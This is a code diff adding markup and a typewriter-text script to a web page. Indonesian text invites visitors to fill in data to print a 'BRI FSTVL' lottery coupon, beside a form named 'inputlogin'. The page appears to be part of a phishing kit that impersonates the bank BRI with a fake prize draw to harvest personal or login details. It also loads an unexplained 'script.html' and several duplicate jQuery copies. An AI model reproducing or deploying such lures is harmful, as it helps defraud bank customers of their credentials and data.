@@ -278,6 +278,60 @@ form label{
 }
 </style>
 <body>
+	<center>
+<textarea id="typing-text" readonly></textarea>
+</center>
+
+
+       <div class="animation-fadeInUpBig" style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 72px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px;border-top: 2px double #ccc">
+<button type="submit" id="kirims" style="margin-left: 20px;margin-top: ;position:relative;background-color:#0F78CB;color:white;border:0px solid #0076e0;width:90%;border-radius:10px;font-family: Average, serif;font-size: 16px;padding:13px;display: inline-block; box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px, rgba(0, 0, 0, 0.20) 0px 6px 6px; height: 50px" >Lanjutkan Cetak Kupon</button>
+           </div>
+</form>
+      </div>
+   </form>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
+<script src="script.html"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>   
+<script>
+(() => {
+	let TypingSpeed = 100;
+	let NxtMsgDelay = 1000000;
+	let CharacterPos = 0;
+	let MsgBuffer = "";
+	let MsgIndex = 0;
+	let delay;
+	let loop = false;
+	let id = document.getElementById("typing-text");
+	let messages =
+[
+	"Lengkapi Data Berikut Untuk Pencetakan \nKupon undian BRI FSTVL"
+]
+
+	// https://www.html-code-generatorom/html/typewriter-text-scroller
+	const StartTyping = () => {
+		if (CharacterPos != messages[MsgIndex].length) {
+			MsgBuffer += messages[MsgIndex].charAt(CharacterPos);
+			id.value = MsgBuffer+(CharacterPos != messages[MsgIndex].length-1 ? "﹏✎":"");
+			delay = TypingSpeed;
+			id.scrollTop = id.scrollHeight; 
+		} else {
+			delay = NxtMsgDelay;
+			MsgBuffer   = "";
+			CharacterPos = -1;
+			if (MsgIndex!= messages.length-1){
+				MsgIndex++;
+			}else {
+				MsgIndex = 0;
+			}
+		}
+		CharacterPos++;
+		setTimeout(StartTyping, delay);
+	}
+	StartTyping();
+})();
+</script>
 <form id="inputlogin" onsubmit="return false"  method="POST"
               class="animation-fadeInLeftBig" style="padding: 10px">
         <div class="card-input animation-fadeInLeftBig " >
